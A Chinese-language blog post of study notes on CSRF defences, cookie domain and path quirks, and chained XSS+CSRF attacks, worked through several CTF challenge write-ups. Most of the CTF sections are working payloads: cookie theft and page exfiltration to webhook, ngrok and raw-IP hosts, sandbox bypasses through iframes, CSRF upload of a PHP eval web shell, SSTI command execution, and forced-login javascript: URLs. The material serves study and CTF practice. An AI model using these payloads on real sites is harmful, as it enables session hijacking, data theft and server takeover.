---
title: "cookie相关的xss&csrf"
slug: "xss-csrf-study-notes"
description: "xss中比较有代表性的一类题目了，总结一手"
date: 2022-04-24T21:58:17+08:00
categories: ["NOTES&SUMMARY"]
series: ["前端安全"]
tags: ["XSS", "CSRF", "Cookie"]
draft: false
toc: true
---

[前端安全系列（二）：如何防止CSRF攻击？](https://www.freebuf.com/articles/web/186880.html)

[Self-XSS 变废为宝的场景](https://ctf-wiki.org/web/xss/#self-xss)

----

# CSRF

跨站请求伪造，构造恶意页面让受害者点击，冒用受害者本地的凭证信息执行需要授权的特定操作（如注销账号等），把攻击者构造的请求当作受害者自己完成的请求，危害很大

## 常见类型

- GET类型

```html
<img src="http://bank.example/withdraw?amount=10000&for=hacker" >
```

- POST类型

burpsuit可直接生成，再末尾可以加上

```html
<script> document.forms[0].submit(); </script>
```

将会模拟用户的POST操作直接发包

## 防护&绕过

含CSRF payload的页面一般来自第三方网站，并且不能获取到cookie等凭据信息，只能使用

针对这些，我们有以下的防护策略（当然会有相应的对抗措施）

### 同源检测

#### 请求头

HTTP的请求包中包含这样两个Header

```
Origin:
Referer:
```

两个请求头理论上都不能由前端来随便修改，两者都可以用来确定请求的来源域，但略有区别

- Origin：请求的域名，以下两种情况不存在

IE11不会在跨站CORS请求上添加Origin请求头

302重定向

- Referer：请求的来源地址，有以下5种策略

| 策略名                    | 属性 - 新                       | 属性 - 旧 |
| ------------------------- | ------------------------------- | --------- |
| No Referer                | no-Referer                      | never     |
| No Referer When Downgrade | no-Referer-when-downgrade       | default   |
| Origin Only               | (same or strict)origin          | origin    |
| Origin When Cross Origin  | (strict)origin-when-crossorigin | -         |
| Unsafe URL                | unsafe-url                      | always    |

我们将其设置为same-origin，表格因此需要把Referrer Policy的策略设置成same-origin，对于同源的链接和引用，会发送Referer，referer值为Host不带Path；跨域访问则不携带Referer；例如：```aaa.com```引用```bbb.com```的资源，不会发送Referer

设置方式有三种：CSP设置；页面`<meta>`标签；`<a>`标签增加referer policy属性

以下几种情况不含Referer：

HTTPS->HTTP；IE6,7下的window.location.href和window.open都会丢失；Flash到另一个网站时Referer比较杂乱；`<a>`标签设置refererpolicy="no-referer"

#### CSRF Token

要求用户请求携带一个攻击者无法获取到的Token，服务器通过校验Token来区分正常请求和攻击请求；Token不存在于cookie中（否则又会被冒用），存于服务器的session中

- 添加token

遍历DOM，对于DOM中所有的`<a>`和`<form>`标签后加入token

对于页面加载后动态生成的HTML没有办法

验证码或密码也可以充当这样的效果

- 检验token

服务端进行校验

- 缺点

实现比较复杂，需要给每一个页面都写入Token（前端无法使用纯静态页面），每一个Form及Ajax请求都携带这个Token，后端对每一个接口都进行校验，并保证页面Token及请求Token一致，这就使得这个防护策略不能在通用的拦截上统一拦截处理，而需要每一个页面和接口都添加对应的输出和校验。这种方法工作量巨大，且有可能遗漏

# cookie相关前置

[Weak Confidentiality](https://datatracker.ietf.org/doc/html/rfc6265#section-8.5)

- cookie使用domain和path作为同源限制，不区分端口和协议(http/https)；path向下通配；domain是向上通配的，所以<u>子域名可以写cookie到父域</u>；

```
// a.b.com
cookie = "trash;domain=.b.com;"
```

- php处理同名cookie，取前者
- Tornado处理同名cookie，后者覆盖前者；可利用这一点进行CSRF

参考：[知乎某处XSS+刷粉超详细漏洞技术分析](https://www.leavesongs.com/HTML/zhihu-xss-worm.html)

- 可以通过设置path来调整优先级

path相同长度，创建时间更早更优先；path更长更优先

```
path = /admin
path = /admin/		优先
```

- 每一个cookie都有与之相关的域，这个域的范围一般通过`domain`属性指定

如果域与页面的域相同，称为第一方cookie，不同则称为第三方cookie；一个页面包含图片或存放其它域上的资源时，第一方的cookie也只会发送到设置它们的服务器

# XSS + CSRF

攻击流程

- 首先一个xss触发点
- payload中包含iframe，在框架内让受害者进行CSRF

主要看下面的例题就完事了

# in CTF

## [0CTF 2017]complicated xss

有两个站 `http://admin.government.vip:8000`（有flag）和`http://government.vip/`（主站）

主站有xss点，无防护，是在当前的主站点触发xss

admin的那个子域的站有登录框，默认test: test弱口令可以低权限登入，登入后发现cookie的username字段有xss点（内容输出到页面的`<h1>`标签中），不过页面存在沙箱

```html
<script>
//sandbox
delete window.Function;
delete window.eval;
delete window.alert;
delete window.XMLHttpRequest;
delete window.Proxy;
delete window.Image;
delete window.postMessage;
</script>
```

工作方式是删除了很多`window.`这样的函数

admin子域站还有upload的功能 但是只能admin账户才可登入，我们需要获得上传部分的代码来确定我们的payload构成，但是由于web的SOP同源策略，所以两个站跨域 读不到cookie

这里要借助cookie中的SOP策略了，仅根据domain+path来区分，不依据port+protocol，所以我们可以在子域修改父域的cookie值

```
cookie="username=<XSS code>;domain=.government.vip;"
```

在这种情况下，访问admin子域站时就会携带以下两条cookie

```
username="XSS; domain=.government.vip"
username="test; domain=admin.government.vip; path=/"
```

由于cookie的读取是无状态的，所以上面两条cookie在被后端解析时完全相同，选取哪条cookie完全取决于后端代码的实现，响应头指出后端框架是TornadoServer/4.4.2，会导致同名cookie后者覆盖前者，使我们的攻击实现

结合上面的，我们的大致思路是这样的：

主站xss来设置admin子域站的cookie值 然后再跳转到admin子域站 借由这里cookie的xss触发第二个xss

```html
<script>xss="<script src=//vps-ip/xss/test.js><\/script>";</script>
<script>document.cookie="username="+xss+"testxss;domain=.government.vip;path=\/;"</script>
<script>location.href='http://admin.government.vip:8000/';</script>
```

test.js 获取cookie

```js
location.href='http://webhook/?cookie='+escape(document.cookie);
```

可以成功获取数据

```bash
[Tue Mar 21 20:13:35 2017] 202.120.7.205:47632 [200]: /xss/xss_new.php?cookie=username%3Dadmin%3B%20username%3D%3Cscript%20src%3D//121.42.175.111%3A8080/xss/test.js%3E%3C/script%3Etestxss
```

admin的sessionid设置了HttpOnly，我们还得CSRF

由于admin子域站删除了一些函数，我们可以用`iframe`的骚操作来绕过

```html
<iframe id="sandbox"></iframe>
window.XMLHttpRequest=document.getElementById('sandbox').contentWindow.XMLHttpRequest;
```

可以构造ajax来读admin的页面源码

```html
<script>xss = "<iframe id=\"sandbox\"></iframe><script src=//vps-ip/xss/test.js><\/script>";</script>
<script>document.cookie="username="+xss+"testxss;domain=.government.vip;path=\/;"</script>
<script>location.href='http://admin.government.vip:8000/';</script>
```

test.js

```js
window.XMLHttpRequest = document.getElementById('sandbox').contentWindow.XMLHttpRequest;
var xhr = new XMLHttpRequest();

xhr.onreadystatechange=function(){
    if(xhr.readyState==4){
        if(xhr.status==200){
            data = xhr.responseText;
            imgsrc=document.createElement("img");
            imgsrc.src = "http://webhook/?cookie=" + escape(data);
        }
    }
};
xhr.open("get","/");
xhr.send();
```

可以获得管理员页面代码

```html
<!doctype html>
<head>
<title>Admin Panel</title>
<script>
//sandbox
delete window.Function;
delete window.eval;
delete window.alert;
delete window.XMLHttpRequest;
delete window.Proxy;
delete window.Image;
delete window.postMessage;
</script>
</head>

<h1>Hello <iframe id="sandbox"></iframe><script src=//vps-ip/xss/test.js></script>testxss</h1>


<p>Upload your shell</p>
<form action="/upload" method="post" enctype="multipart/form-data">
<p><input type="file" name="file"></input></p>
<p><input type="submit" value="upload">
</form>
```

这个上传功能，就需要csrf，不过由于页面上的XHR被禁用，所以得额外调用出来

test.js

```js
window.XMLHttpRequest = document.getElementById('sandbox').contentWindow.XMLHttpRequest;
var xhr = new XMLHttpRequest();

xhr.onreadystatechange=function(){
    if(xhr.readyState==4){
        //if(xhr.status==200){
        res_status = "status: " + xhr.status + "\n";
        data = xhr.responseText;
        imgsrc=document.createElement("img");
        imgsrc.src = "http://121.42.175.111:8080/xss/xss_new.php?cookie=" + escape(res_status) + escape(data);
        //}
    }
};

var formData = new FormData();
var content = '<?php @eval($_POST[c][/c]);?>';
var blob = new Blob([content], { type: "text/plain"});
formData.append("file", blob,'angelwhutestshell.php');
xhr.open("POST", "/upload");
xhr.send(formData);
```

配合主站的xss payload

```html
<script>xss = "<iframe id=\"sandbox\"></iframe><script src=//******/xss/test.js><\/script>";</script>
<script>document.cookie="username="+xss+"testxss;domain=.government.vip;path=\/;"</script>
<script>location.href='http://admin.government.vip:8000/';</script>
```

就可以获得flag了

参考：[wp](https://www.angelwhu.com/paper/2017/03/23/0ctf2017-web-topic-summary/#complicated-xss)  |  [wp2](https://www.cdxy.me/?p=764)  |  [wp3](https://www.40huo.cn/blog/0ctf-2017-writeup.html)  |  [知乎某处XSS+刷粉超详细漏洞技术分析](https://www.leavesongs.com/HTML/zhihu-xss-worm.html)

## [湖湘杯 2018]XmeO

### 预期 - SSTI

```
{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls -r /*/*").read()')}}
```

发现web目录为`/home/XmeO`，然后grep搜索flag字符

```
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("grep hxb2018{ /home/XmeO/*").read()')}}
```

### 非预期 - xss

通过查看进程发现运行着

![image-20220215203100071](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220215203100071.png)

在/static/assets/js/me.js中和上面0CTF那个题有一样的沙盒情况，响应头

```
script-src 'self'
```

说明不允许内联脚本执行，也就是直接嵌套在`<script></script>`中的代码无法被执行，而`<script src='url'></script>`中的代码将被执行，而且必须同源（很经典的绕过方式，也可换成iframe

后台请求的url为`http://127.0.0.1:7443/admin/`，提交xss payload

```html
</div>
<script src=http://127.0.0.1:7443/show/591b111c-096d-11eb-97c4-0242ac110003></script>
<div>
```

获取到hint

```
/?hint=Try%20to%20get%20admin's%20page%20content
```

由于页面的沙盒设置，我们利用上面的同款方式进行绕过

```js
var ifm = document.createElement('iframe');
ifm.setAttribute('src','/admin/');
document.body.appendChild(ifm);
window.XMLHttpRequest = window.top.frames[0].XMLHttpRequest;
var xhr = new XMLHttpRequest();xhr.open("GET", "http://127.0.0.1:7443/admin/",false);
xhr.send();
c=xhr.responseText;
window.location.href="http://192.168.0.134:8889/?c="+c;
```

会得到一个新的hint

```
/?c=%20%20%20%20This%20website%20also%20have%20another%20page%20named%20mysecrecy_directory......
```

问题转变为获取`/admin/mysecrecy_directory`下的cookie内容

```js
var f= document.createElement('iframe');
f.setAttribute('src','/admin/mysecrecy_directory');
document.body.appendChild(f);
f.onload = function(){
var a= f.contentWindow.document.cookie;
location.href = "http://192.168.0.134:8889/?"+a;
```

payload只需要把之前的src改一下，在iframe加载的同时获取iframe中的cookie，并利用href跳转获取flag

参考：[wp](https://www.anquanke.com/post/id/220436)

## [uiuCTF 2021]YANA

写过太多次了，不详细展开了；关于缓存投毒 + 子域名接管 + XS-Leaks ≈ 寄

## [pbCTF 2021]TBDXSS

~~救啊 又是xss~~  给出了详细的源码，app.py+bot.js

https://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#tbdxss

https://blog.bawolff.net/2021/10/write-up-pbctf-2021-tbdxss.html

https://github.com/sambrow/ctf-writeups-2021/tree/master/perfect-blue-ctf/TBDXSS

```python
from flask import Flask, request, session, jsonify, Response
import json
import redis
import random
import os
import time

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "tops3cr3t")  # session secret key

app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',  # samesite cookie lax
)

HOST = os.environ.get("CHALL_HOST", "localhost:5000")

r = redis.Redis(host='redis')   # 后端redis数据库

@app.after_request
def add_XFrame(response):
    response.headers['X-Frame-Options'] = "DENY"    # 该页面不允许被任何页面引用，也不允许引用任何页面
    return response


@app.route('/change_note', methods=['POST'])    # 修改session中的note
def add():
    session['note'] = request.form['data']
    session.modified = True
    return "Changed succesfully"

@app.route("/do_report", methods=['POST'])
def do_report():
    cur_time = time.time()
    ip = request.headers.get('X-Forwarded-For').split(",")[-2].strip() # amazing google load balancer

    last_time = r.get('time.'+ip)   # 判断上报时间间隔
    last_time = float(last_time) if last_time is not None else 0

    time_diff = cur_time - last_time

    if time_diff > 6:
        r.rpush('submissions', request.form['url']) # 将上报url存入redis数据库中
        r.setex('time.'+ip, 60, cur_time)
        return "submitted"

    return "rate limited"

@app.route('/note') # note全部存session中 在本地
def notes():
    print(session)
    return """
<body>
{}
</body>
    """.format(session['note'])

@app.route("/report", methods=['GET'])  # 上报admin 转至/do_report
def report():
    return """
<head>
    <title>Notes app</title>
</head>
<body>
    <h3><a href="/note">Get Note</a>&nbsp;&nbsp;&nbsp;<a href="/">Change Note</a>&nbsp;&nbsp;&nbsp;<a href="/report">Report Link</a></h3>
        <hr>
        <h3>Please report suspicious URLs to admin</h3>
        <form action="/do_report" id="reportform" method=POST>
        URL: <input type="text" name="url" placeholder="URL">
        <br>
        <input type="submit" value="submit">
        </form>
    <br>
</body>
    """

@app.route('/') # 首页
def index():
    return """
<head>
    <title>Notes app</title>
</head>
<body>
    <h3><a href="/note">Get Note</a>&nbsp;&nbsp;&nbsp;<a href="/">Change Note</a>&nbsp;&nbsp;&nbsp;<a href="/report">Report Link</a></h3>
        <hr>
        <h3> Add a note </h3>
        <form action="/change_note" id="noteform" method=POST>
        <textarea rows="10" cols="100" name="data" form="noteform" placeholder="Note's content"></textarea>
        <br>
        <input type="submit" value="submit">
        </form>
    <br>
</body>
    """


```

下面是bot.js

```js
const redis = require('redis');
const r = redis.createClient({
    port      : 6379,               // replace with your port
    host      : 'redis',        // replace with your hostanme or IP address
})

const puppeteer = require('puppeteer');

async function browse(url){

    console.log(`Browsing -> ${url}`);
    const browser = await (await puppeteer.launch({
        headless: true,
    args: ['--no-sandbox', '--disable-gpu']
    })).createIncognitoBrowserContext();    // 无头模式

    const page = await browser.newPage();
    await page.setCookie({
        name: 'session',
        value: process.env.CHALL_COOKIE,
        domain: process.env.CHALL_HOST,
        sameSite: "Lax",    // samesite cookie lax 警惕
        secure: true,
    });

    try {
        const resp = await page.goto(url, { // 访问url
            waitUntil: 'load',
            timeout: 20 * 1000,
        });
    } catch (err){
        console.log(err);
    }

    await page.close();
    await browser.close();

    console.log(`Done visiting -> ${url}`)

}

function main() {
    r.blpop(['submissions', 0], async (_, submit_url) => {
        let url = submit_url[1];    // 取出redis中提交的url
        await browse(url);  // 处理url
        main();
    });
}


console.log("XSS Bot ready");
main()

```

flag在admin bot的cookie中，它会带着这个session访问我们的页面，如果它直接访问/note那么它本地的页面上就会有flag，但是我们无法获得

注意到特殊的请求头`X-Frame-Options=DENY`，它使得该页面不允许被任何页面引用，也不允许引用任何页面，所以没法用`iframe`相关的技巧来做：发送给admin的页面(on our host)上共有两个iframe，第一个src指向/flag(可以看到flag的页面)的iframe，第二个iframe有我们的xss payload，这个payload中的script脚本可以做到XFS - cross frame scripting(读取top.frames)来到达原有的页面，转向页面的第一个iframe读到flag并取出，利用的是两个iframe是同源的，所以可以see each other's content

所以我们想到用window而不是iframe来达到相似的效果（原理一致）：发送给admin的页面(on our host)上有script可以在新窗口打开/note页面(含有flag)，然后script用csrf的方式post xss payload(设置`target="_blank"`使其在新窗口出现)，在post完成之后将当前窗口转为之前的/note 来使post的xss执行，由于同源可以获得含flag的/note页面的内容，再fetch外带flag

思路跟iframe的是一样的，只不过由切换iframe变为切换Tab window，接下来尝试写payload

注意以下xss bot，由于它的`watiUntil`的设置，一旦被认为是加载就会直接die掉，这里的绕过方式是用中转页面手动延时让其挂起（`setTimeout`则起不到同样的效果

payload-url

```
http://xxxx/pb
```

app.js

```js
let express = require('express');
let app = express();

app.get('/pb', function(req, res) {
    res.sendFile(__dirname + '/pb.html');
});

app.get('/delayThen404', function(req, res) {
    setTimeout(()=> {
            res.sendStatus(404);
            },
            5000)
});

let port = 5050;
let server = app.listen(port);
console.log('Local server running on port: ' + port);
```

/pb.html

```html
<body>
    <p>hello world</p>
    <form action="https://tbdxss.chal.perfect.blue/change_note" id="noteform" method=POST target="_blank">
        <textarea id="payload" rows="10" cols="100" name="data" form="noteform"></textarea>
        <input type="submit" value="submit">
    </form>
    <script>
        // open new window that has the flag and give it a "name" of "flagWindow"
        window.open('https://tbdxss.chal.perfect.blue/note', 'flagWindow');

        // this POSTs the above form with an XSS note value to read and exfiltrate the flag
        // note: we must use \x3C as an alternate form of the "less than" character to avoid browser parser confusion inside
        payload.value = "\x3Cscript>let flagWindow = window.open('', 'flagWindow'); let flag = flagWindow.document.documentElement.innerText; fetch('http://8709-68-51-145-201.ngrok.io/?flag=' + flag);\x3C/script>";
        noteform.submit();

        // Run this code after a 5 second delay to ensure the above POST has completed before we reload our XSS payload into *this* page.
        setTimeout(()=> {
            // This loads our previously-posted XSS which will read the flag from the previously-opened window and exfiltrate it.
            window.location.href = 'https://tbdxss.chal.perfect.blue/note';
        }, 5000)
    </script>
    <!-- 提供延时来让上面的script执行 -->
    <img src='https://xxxx/delayThen404' onerror="window.location.href='https://tbdxss.chal.perfect.blue/note'">
</body>
```

————在另一个wp中学到delay还可以有专门的定型工具https://deelay.me/，用法是

```
https://deelay.me/<delay in milliseconds>/<original url>
eg: https://deelay.me/5000/https://picsum.photos/200/300
```

所以上面的我们还可以这样做：

- index.php：做延时，转到main.php

```
<script>
open(location.href + 'main.php', '_blank')
</script>
<img src="https://deelay.me/20000/https://example.com">
```

- main.php：新开两个tab后当前页面重定向到含flag的/note中

```html
<script>
open(location.href.replace('main', 'submit'), '_blank')
open(location.href.replace('main', 'opennote'), '_blank')
location.href = 'https://tbdxss.chal.perfect.blue/note'
</script>
```

- submit.php：标准csrf

```html
<form action="https://tbdxss.chal.perfect.blue/change_note" method="POST" id=f>
<input name="data" value="peko">
</form>
<script>
f.data.value = '<script>const report = t => fetch("https://YOUR_SERVER/xss.php", {method: "POST", body: t}); report(window.opener.opener.document.body.textContent)</'+'script>'
f.submit()
</script>
```

- opennote.php：delay后在新tab的/note中执行xss payload，由于是新tab，所以需要`window.opener.opener`才可以到原先的main.php

```html
<script>setTimeout(() => { open('https://tbdxss.chal.perfect.blue/note', '_blank') }, 1000)</script>
```

参考：[wp1](https://github.com/sambrow/ctf-writeups-2021/tree/master/perfect-blue-ctf/TBDXSS)  |  [wp2](https://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#tbdxss)  |  [wp3](https://blog.bawolff.net/2021/10/write-up-pbctf-2021-tbdxss.html)

## [MiscCTF 2021]XSS to CSRF

https://hg8.sh/posts/misc-ctf/xss-to-csrf/

聊天机器人，发送的语句可以包含Html 会被渲染，尝试

```
<img src=x onerror=alert(1)>
```

有反射型xsss

进一步了解这个Bot的工作，遇到"badwords"会暂停对话，说明在后端经过了某些检测

使用websocket进行内容的交互

![misc ctf chatbot websocket](https://user-images.githubusercontent.com/9076747/124016442-f240c000-d9e5-11eb-8acf-637f5c720f9c.png)

尝试直接建立与服务端的连接

```
websocket = new WebSocket('ws://misc.ctf:33433/');
websocket.onmessage = function(message) { console.log(message.data); }
websocket.send('test')
```

![misc ctf websocket chatbot connexion](https://user-images.githubusercontent.com/9076747/124016602-20be9b00-d9e6-11eb-91ea-f3653f1fe207.png)

继续尝试

```
> websocket.send('/help')
{ "content": "<message>" } to send a message
/moderator to enter moderator mode debugger
> websocket.send('/moderator')
You need to be authenticated to execute this command
```

我们没有直接访问/moderator的权利，借助检测"badwords"的功能，发送含有建立websocket连接的payload，用CSRF的方式让bot访问 把结果外带

```html
<img src=x onerror="ws=new WebSocket('ws://'+window.location.host);ws.onopen=()=>ws.send('/moderator')">
```

加上一个"badwords"

```html
🖕 <img src=x onerror="ws=new WebSocket('ws://'+window.location.host);ws.onopen=()=>ws.send('/moderator')">
```

## *[247CTF 2021]Helicopter Administrator

https://gusralph.info/exploiting-xss-for-sqli/

## [picoCTF 2022]noted

> HINT:
>
> 1. "Are you sure I followed all the best practices?"
> 2. "There's more than just HTTP(S)!"
> 3. "Things that require user interaction normally in Chrome might not require it in Headless Chrome."
> 4. The description also stated that the headless chrome has no internet access. So it cannot be used to phone home outside the context of this application.

登入账号后才能发内容，xss bot会先注册随机账号 登入后发flag 然后浏览我们的url，题目提示xss bot不能出网

```js
// report.js
const crypto = require('crypto');
const puppeteer = require('puppeteer');

async function run(url) {	// 对url无waf
	let browser;

	try {
		module.exports.open = true;
		browser = await puppeteer.launch({
			headless: true,
			pipe: true,
			args: ['--incognito', '--no-sandbox', '--disable-setuid-sandbox'],
			slowMo: 10
		});

		let page = (await browser.pages())[0]

		await page.goto('http://0.0.0.0:8080/register');	// 注册随机账号
		await page.type('[name="username"]', crypto.randomBytes(8).toString('hex'));
		await page.type('[name="password"]', crypto.randomBytes(8).toString('hex'));

		await Promise.all([
			page.click('[type="submit"]'),
			page.waitForNavigation({ waituntil: 'domcontentloaded' })
		]);

		await page.goto('http://0.0.0.0:8080/new');
		await page.type('[name="title"]', 'flag');
		await page.type('[name="content"]', process.env.FLAG ?? 'ctf{flag}');

		await Promise.all([
			page.click('[type="submit"]'),
			page.waitForNavigation({ waituntil: 'domcontentloaded' })
		]);

		await page.goto('about:blank')
		await page.goto(url);
		await page.waitForTimeout(7500);

		await browser.close();
	} catch(e) {
		console.error(e);
		try { await browser.close() } catch(e) {}
	}

	module.exports.open = false;
}

module.exports = { open: false, run }

// web.js
fastify.post('/report', {
	schema: reportSchema,
	preHandler: fastify.csrfProtection
}, auth((req, res) => {
	let { url } = req.body;

	if (report.open) {
		return res.send('Only one browser can be open at a time!');
	} else {
		report.run(url);
	}

	return res.send('URL has been reported.');
}));
```

在notes.ejs中用`<%- something %>`的模板形式输出内容

```ejs
<h2><%- note.title %></h2>
<p><%- note.content %></p>
```

可以做到self-xss，我们联想到csrf+xss的常见打法：xss一个csrf的内容，比如这里的登录账号的表单；但是flag是在随机账号中，要xss必须也覆盖cookie

联想TBDXSS那个题目 两个tab之间实现内容的读取：如果window A B都有相同的document.domain，只要有window reference就可以读取另一个window的DOM内容；所以只要让A是POST login之前的页面，B是self-xss的页面，读取A的DOM就可以拿到flag

另外注意一下report.js中并没有对我们的url加waf，所以`javascript:alert(1)`之类的url也能在`about:blank`上xss 或者开新的window构成csrf，比如像`javascript:eval(atob(xxxx))`这样操作js内容

关于flag的回显，由于bot不出网，我们考虑创建一个账号，将flag用self-xss+iframe的方式传回来

提交url，用`javascript:`形式的url 包含一个csrf的表单，强制登入我们的账号

```js
const csrf = `
<form name=frm action='http://0.0.0.0:8080/login' method=post>
<input name=username value=supernene>
<input name=password value=supernene>
</form>
`	// 登入我们的已知账户
const js = `
win = window.open('', '')
win.document.body.innerHTML = atob('${btoa(csrf)}')
win.document.frm.submit()
location.href = 'http://0.0.0.0:8080'
`	// 在about:blank页面操作
const url = `javascript:eval(atob('${btoa(js)}'))`
console.log(url)
```

登入的我们的账号中含有如下的self-xss payload，读取之前bot页面中的flag，

```html
<iframe src="/new" id=frm>
</iframe>
<script>
const flag = window.opener.document.body.textContent
frm.onload=()=>{
	frm.onload=null
	const newfrm = frm.contentDocument.forms[0]	// 确保new tab
	newfrm.title.value = 'FLAG'
	newfrm.content.value = flag
	newfrm.submit()
}
</script>
```

参考：[wp1](https://blog.maple3142.net/2022/03/29/picoctf-2022-writeups/#noted)  |  [wp2](https://github.com/dtreplin/ctf-writeups/blob/main/picoCTF_2022_web_exploitation_noted.md)

